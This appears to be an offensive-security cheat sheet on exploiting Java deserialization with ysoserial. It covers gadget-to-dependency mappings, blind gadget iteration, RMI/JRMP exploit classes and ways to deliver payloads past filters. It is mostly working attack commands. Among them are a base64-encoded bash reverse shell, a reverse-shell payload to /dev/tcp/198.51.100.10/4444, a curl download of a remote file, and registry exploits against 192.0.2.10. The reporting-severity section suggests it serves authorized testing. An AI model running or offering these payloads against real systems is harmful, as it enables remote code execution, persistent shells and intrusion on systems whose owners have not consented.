# Java Deserialization — ysoserial, gadget→dependency map, RMI/JRMP

## 1. ysoserial basics

```
java -jar ysoserial.jar                          # usage + full gadget list
java -jar ysoserial.jar <Gadget> '<command>' > payload.bin
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0
```

Newer JDKs may need module opens:

```
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     --add-opens=java.base/java.util=ALL-UNNAMED \
     -jar ysoserial.jar CommonsCollections6 'id' > cc6.bin
```

## 2. First probe: URLDNS (always)

```
java -jar ysoserial.jar URLDNS 'http://java-<id>.oast.pro/' > urldns.bin
```

- **Zero third-party dependencies** — works against any
  `ObjectInputStream.readObject()` regardless of classpath.
- Triggers a DNS lookup only (no code exec): a hit in `interactsh-client -json`
  output confirms the sink and justifies gadget iteration.
- Use a distinct OAST label per sink and per gadget
  (`cc6-sinkA.<id>.oast.pro`) so callbacks self-identify what worked.

## 3. Gadget → required classpath map

| Gadget | Requires on target classpath |
|---|---|
| URLDNS | nothing (JRE only) |
| CommonsCollections1 | commons-collections 3.1 **and** JRE ≤ 8u71 (AnnotationInvocationHandler) |
| CommonsCollections3 | commons-collections 3.1 + old JRE (same trampoline, TrAX) |
| CommonsCollections5 | commons-collections 3.1 (BadAttributeValueExpException — works on newer JREs) |
| CommonsCollections6 | commons-collections 3.1 (HashSet trigger — **most reliable CC chain**) |
| CommonsCollections7 | commons-collections 3.1 (Hashtable trigger) |
| CommonsCollections2 | commons-collections4 4.0 (PriorityQueue + TemplatesImpl) |
| CommonsCollections4 | commons-collections4 4.0 |
| CommonsBeanutils1 | commons-beanutils 1.9.x (+ commons-collections for comparator) |
| Groovy1 | groovy 2.3.9 |
| Spring1 | spring-core + spring-beans 4.1.4 |
| Spring2 | spring-core 4.1.4 + spring-aop |
| Hibernate1 | hibernate-core |
| C3P0 | c3p0 0.9.5.2 (loads class from attacker HTTP URL) |
| Clojure | clojure 1.8.0 |
| JavassistWeld1 | javassist + weld-core |
| JBossInterceptors1 | javassist + jboss-interceptor |
| ROME | rome 1.0 (ToStringBean + TemplatesImpl) |
| MozillaRhino1/2 | js (Rhino) 1.7R2 |
| Myfaces1/2 | myfaces-impl |
| Vaadin1 | vaadin-server 7.7.14 |
| AspectJWeaver | aspectjweaver + commons-collections 3.x (arbitrary file write) |
| FileUpload1 | commons-fileupload 1.3.1 (file write, not exec) |
| Wicket1 | wicket-util (file write) |
| JRMPClient | JRE only — victim opens JRMP connection to your JRMPListener |
| JRMPListener | JRE only — turns victim into a JRMP listener (bind) |
| Jython1 | jython-standalone |
| BeanShell1 | bsh 2.0b5 |
| JSON1 | json-lib + spring (2nd-order) |

Classpath intel sources: stack traces (library names/versions), exposed
`pom.xml`/`MANIFEST.MF`, `/actuator` dumps, fingerprinted framework (Spring,
JBoss, WebLogic, Jenkins each imply known libs), jar listings from LFI.
Blind: iterate CC6 → CC5 → CB1 → CC2/4 → Spring1 → ROME → Groovy1, each with
its own OAST subdomain.

## 4. Runtime.exec quirks (commands run WITHOUT a shell)

`Runtime.getRuntime().exec(cmd)` splits on whitespace — no pipes, redirects,
quotes. Fixes:

```
bash -c {curl,-o,/tmp/x,http://198.51.100.10/x}                 # ${IFS} comma trick
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjEwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}
java -jar ysoserial.jar CommonsCollections6 \
  'bash -c {bash,-i},>&,/dev/tcp/198.51.100.10/4444,0>&1' > rev.bin
```

Or generate with https://ares-x.com/tools/runtime-exec style base64 wrapping:
`bash -c {echo,<b64>}|{base64,-d}|{bash,-i}`.

## 5. RMI / JRMP exploitation classes

Run from the ysoserial jar (`-cp ysoserial.jar <class>`):

```
# Attack a remote RMI registry (port 1099) directly:
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit \
     192.0.2.10 1099 CommonsCollections6 'nslookup rmi-<id>.oast.pro'

# Host a malicious JRMP listener; point a JRMPClient payload at it:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener \
     1099 CommonsCollections6 'id'
java -jar ysoserial.jar JRMPClient '198.51.100.10:1099' > jrmpclient.bin
# deliver jrmpclient.bin into the app's sink -> victim dials your listener ->
# listener replies with the real gadget. Beats classpath guessing AND
# look-ahead/allowlist filters that permit java.rmi.* classes.

# Generic JRMP client against an exposed JRMP/RMI endpoint:
java -cp ysoserial.jar ysoserial.exploit.JRMPClient \
     192.0.2.10 1099 CommonsCollections6 'id'
```

## 6. Delivery notes

- Re-encode exactly like the original blob (b64 / URL-safe b64 / gzip+b64 /
  URL-encoded). `base64 -w0 payload.bin | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))"`.
- Big payloads can exceed cookie/header limits — prefer body params or CC6
  (compact) over TemplatesImpl chains when size-constrained.
- Filters (SerialKiller, JEP 290 filters, look-ahead OIS): try JRMPClient
  (minimal class set), second-order sinks (the filtered entry point may not be
  the only one), and alternate protocols (JMX, T3, JMS) hitting the same JVM.
- WebLogic T3 / Jenkins CLI / JBoss JMXInvokerServlet (`/invoker/JMXInvokerServlet`,
  POST the raw `ac ed` stream, Content-Type `application/octet-stream`) are
  classic network seats for these same payloads.

## 7. Verification evidence to capture

For the finding (see `rupu.md`): the exact generation command, the delivery
HTTP request (with the encoded blob), and the proof — interactsh JSON hit,
command output in a response, or the server-side effect. Severity `critical`
for callback/RCE; `high` for a confirmed parse-oracle without a working gadget.
